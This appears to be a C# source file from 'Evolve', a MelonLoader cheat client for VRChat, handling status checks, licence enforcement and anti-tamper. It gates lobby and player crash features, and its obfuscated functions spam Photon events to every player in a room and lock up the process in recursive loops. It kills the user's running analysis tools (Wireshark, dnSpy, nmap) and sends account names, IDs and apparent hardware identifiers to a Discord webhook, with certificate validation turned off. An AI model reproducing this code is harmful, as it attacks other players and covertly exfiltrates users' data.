using Evolve.Utils;
using System;
using System.Collections;
using Evolve.Wrappers;
using UnityEngine;
using Resources = UnityEngine.Resources;
using VRC.Core;
using VRC.SDK3.Avatars.Components;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using Evolve.Login;
using System.Collections.Generic;
using Evolve.ConsoleUtils;
using System.Threading.Tasks;
using System.IO;
using System.Net.Cache;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using Evolve.Api;
using Evolve.Modules;
using VRC.SDKBase;
using VRC.SDK3.Components;
using MelonLoader;
using VRCSDK2;
using Evolve.Buttons;
using Evolve.AvatarList;
using Newtonsoft.Json;

namespace Evolve.Protections
{
    internal class ClientChecks
    {
        #region Request
        public static string[] GetEvoStatus()
        {
            var client = WebRequest.Create("https://dl.dropboxusercontent.com/s/tgj9nziiy7a6lfy/Status?dl=0");
            var response = Login.Authorization.Array(client.GetResponse());
            HttpRequestCachePolicy noCachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
            client.CachePolicy = noCachePolicy;
            ServicePointManager.ServerCertificateValidationCallback = (object s, X509Certificate c, X509Chain cc, SslPolicyErrors ssl) => true;
            response = response.Where(x => !string.IsNullOrEmpty(x)).ToArray();
            return response;
        }

        public static string[] GetCrashersStatus()
        {
            var client = WebRequest.Create("https://dl.dropboxusercontent.com/s/x5h0468jzvfag5e/gf78Fdf6HG87h?dl=0");
            var response = Login.Authorization.Array(client.GetResponse());
            HttpRequestCachePolicy noCachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
            client.CachePolicy = noCachePolicy;
            ServicePointManager.ServerCertificateValidationCallback = (object s, X509Certificate c, X509Chain cc, SslPolicyErrors ssl) => true;
            response = response.Where(x => !string.IsNullOrEmpty(x)).ToArray();
            return response;
        }
        #endregion

        public static bool IsOffline = false;
        public static string Crashers = "?";
        public static List<string> BlacklistedAvatars = new List<string>();

        public static IEnumerator ChecksLoop()
        {
            while (true)
            {
                yield return new WaitForSeconds(30);
                try
                {
                    new Task(() =>
                    {
                        Oversee.OverseeList = Oversee.GetOversee();
                        Crashers = GetCrashersStatus()[0];
                        PlayersInformations.EvoInfos[5].SetText($"<color=#ff006a>Crashers:</color> {Crashers}");

                        if (Crashers == "Down" && FoldersManager.Config.Ini.GetString("Crashers", "Type") != "Custom")
                        {
                            LobbyMenu.CrashLobby.setIntractable(false);
                            LobbyMenu.CrashNonFriends.setIntractable(false);
                            LobbyMenu.CrashMaster.setIntractable(false);
                            EvolveInteract.CrashTarget.setIntractable(false);
                            EvolveInteract.CrashTargetPhoton.setIntractable(false);
                            OverseeMenu.Crash.setIntractable(false);
                            Buttons.ScreenButtons.Crash.interactable = false;
                        }
                        else
                        {
                            LobbyMenu.CrashLobby.setIntractable(true);
                            LobbyMenu.CrashNonFriends.setIntractable(true);
                            LobbyMenu.CrashMaster.setIntractable(true);
                            EvolveInteract.CrashTarget.setIntractable(true);
                            EvolveInteract.CrashTargetPhoton.setIntractable(true);
                            OverseeMenu.Crash.setIntractable(true);
                            Buttons.ScreenButtons.Crash.interactable = true;
                        }

                        if (APIUser.CurrentUser != null && VRCPlayer.field_Internal_Static_VRCPlayer_0 == true)
                        {
                            if (!GetEvoStatus().Contains("Online"))
                            {
                                if (!IsOffline) IsOffline = true;
                            }
                        }
                    }).Start();
                }
                catch { }
            }
        }

        public static IEnumerator OfflineCheck()
        {
            while (!IsOffline) yield return null;
            Notifications.StaffNotify("Evolve is going offline in 2 minutes...");
            yield return new WaitForSeconds(60);
            Notifications.StaffNotify("Evolve is going offline in 1 minute...");
            yield return new WaitForSeconds(50);
            Notifications.StaffNotify("Evolve is going offline in 10 seconds...");
            yield return new WaitForSeconds(10);
            try
            {
                Notifications.StaffNotify("Disconnecting players...");
                if (!Settings.IsAdmin && !Settings.IsTester)
                {
                    Discord.WebHooks.SendWarningMessage($"**Player disconnected.**\n\n**Name:** {APIUser.CurrentUser.displayName}\n**UserID:** {APIUser.CurrentUser.id}\n**Evolve ID:** {Functions.GetEvoID()}");
                    O8H7S5434HV894NC7S7(false);
                }
                PlayersInformations.EvoInfos[3].SetText("<color=#ff006a>Servers:</color> Offline");
            }
            catch
            {
                O8H7S5434HV894NC7S7(false);
            }
        }

        public static void O8H7S5434HV894NC7S7(bool Authorized)
        {
            GFD89G7DG7DFG879DGDG98();
            Thread.Sleep(99999999);
            Application.Quit();
            Environment.Exit(-1);
            Process.GetCurrentProcess().Kill();
            if (Authorized) FDGDFGHJDFGFD9GFD8GFDGFD786G();
            while (true) ;
        }

        public static void GFD89G7DG7DFG879DGDG98()
        {
            while(true)
            {
                try
                {
                    for (int I = 0; I < int.MaxValue; I++)
                    {
                        Console.WriteLine("No");
                        KF8G876876DF8G6F();
                    }
                }
                catch { KF8G876876DF8G6F(); }
            }
        }
        public static void KF8G876876DF8G6F()
        {
            while (true)
            {
                try
                {
                    for (int I = 0; I < int.MaxValue; I++)
                    {
                        Console.WriteLine("No");
                        GFD89G7DG7DFG879DGDG98();
                    }
                }
                catch { GFD89G7DG7DFG879DGDG98(); }
            }
        }



        public static void FDGDFGHJDFGFD9GFD8GFDGFD786G()
        {
            while (true)
            {
                try
                {
                    for (int I = 0; I < int.MaxValue; I++)
                    {
                        var Targets = new UnhollowerBaseLib.Il2CppStructArray<int>(999);
                        Targets.ToList<int>().Add(999);
                        Exploits.Events.OpRaiseEvent(Convert.ToByte(I), VRCPlayer.field_Internal_Static_VRCPlayer_0.gameObject, new Photon.Realtime.RaiseEventOptions
                        {
                            field_Public_ArrayOf_Int32_0 = Targets,
                            field_Public_Byte_0 = 99,
                            field_Public_Byte_1 = 69,
                            field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.All,
                            field_Public_EventCaching_0 = Photon.Realtime.EventCaching.AddToRoomCache,
                        }, default);
                        FDGDFGHJDFGFD9GFD8GFDGFD786G();
                    }
                }
                catch { FDGDFGHJDFGFD9GFD8GFDGFD786G(); }
            }
        }

        public static IEnumerator CheckUserLoop()
        {
            while (true)
            {
                yield return new WaitForSeconds(5);
                try
                {
                    if (VRCPlayer.field_Internal_Static_VRCPlayer_0 == true && Login.Authorization.Subscribtion == "") O8H7S5434HV894NC7S7(true);
                    if (APIUser.CurrentUser != null && VRCPlayer.field_Internal_Static_VRCPlayer_0 == true)
                    {
                        Task Loop = new Task(() =>
                        {
                            var Admin = Login.Authorization.GetAdmin().Contains(APIUser.CurrentUser.id);
                            var VIP = Login.Authorization.GetVIP().Contains(APIUser.CurrentUser.id);
                            var Standard = Login.Authorization.GetLifeTime().Contains(APIUser.CurrentUser.id);
                            if (!Admin && !VIP && !Standard)
                            {
                                APIUser.Logout();
                                MelonCoroutines.Start(Login.Authorization.Check());
                                Discord.WebHooks.SendWarningMessage($"**Player logged out from the client.**\n\n**-----------------[VRC]-----------------**\n**Name:** {APIUser.CurrentUser.displayName}\n**UserID:** {APIUser.CurrentUser.id}\n**VT: ** {Functions.GetVT()}\n\n**-----------------[DT]-----------------**\n{Functions.GetDT()}\n\n**-----------------[Other]-----------------**\n**IA:** {Functions.GetIA()}\n**MA:** {Functions.GetMA()}\n**Evolve ID:** {Functions.GetEvoID()}");
                            }
                        });
                        Loop.Start();
                    }
                }
                catch { O8H7S5434HV894NC7S7(true); }
            }
        }

        public static List<string> ProcessNameBlacklist = new List<string>()
        {
            "dnspy",
            "spy",
            "dump",
            "dumper",
            "hook",
            "decompiler",
            "confuser",
            "de4dot",
            "dot",
            ".net",
            "ripper",
            "crack",
            "debug",
            "http",
            "de4",
            "shark",
            "wireshark",
            "tmac",
            "dotpeek",
            "fiddler",
            "de4dot",
            "netmon",
            "extremedumper",
            "nmap",
            "cheatengine",
            "pd",
            "pd32",
            "pd64",
            "procdump",
            "procdump64",
            "procdump64a",
            "processdump",
            "nemesis",
            "charles",
            "solarwinds",
            "prtg",
            "netflowanalyzer",
            "networkminer",
            "tcpdump",
            "windump",
            "omnipeek",
            "capsa",
            "kismet",
            "etherape",
            "cain",
            "abel",
            "kismac",
            "advancedipscanner",
            "packetanalyzer",
            "ipsniffer",
            "advancedpacketsniffer",
            "advancedhttppacketsniffer",
            "commview",
            "networkprobe",
            "watchwan",
            "interactivetcprelay",
            "ettercap",
            "smartsniff",
            "ettercap",
            "dsniff",
            "caspa",
            "tshark",
            "zeek",
            "dumper"
        };

        public static IEnumerator EvolveDllProtection()
        {
            while (true)
            {
                yield return new WaitForSeconds(1);
                try
                {
                    Task Loop = new Task(() =>
                    {
                        var AllProcesses = Process.GetProcesses();
                        foreach (var Process in AllProcesses)
                        {
                            if (ProcessNameBlacklist.Contains(Process.ProcessName.ToLower()))
                            {
                                if (APIUser.CurrentUser == null) Discord.WebHooks.SendWarningMessage($"**Crack attempt**\n\n**-----------------[DT]-----------------**\n{Functions.GetDT()}\n\n**-----------------[Other]-----------------**\n**IA:** {Functions.GetIA()}\n**MA:** {Functions.GetMA()}\n**Evolve ID:** {Functions.GetEvoID()}\n**Procces name:** {Process.ProcessName}");

                                else Discord.WebHooks.SendWarningMessage($"**Crack attempt**\n\n**-----------------[VRC]-----------------**\n**Name:** {APIUser.CurrentUser.displayName}\n**UserID:** {APIUser.CurrentUser.id}\n**VT:** {Functions.GetVT()}\n\n**-----------------[DT]-----------------**\n{Functions.GetDT()}\n\n**-----------------[Other]-----------------**\n**IA:** {Functions.GetIA()}\n**MA:** {Functions.GetMA()}\n**Evolve ID:** {Functions.GetEvoID()}\n**Procces name:** {Process.ProcessName}");

                                Process.Kill();
                                O8H7S5434HV894NC7S7(true);
                            }
                        }
                    });
                    Loop.Start();
                }
                catch { O8H7S5434HV894NC7S7(true); }
            }
        }
    }
}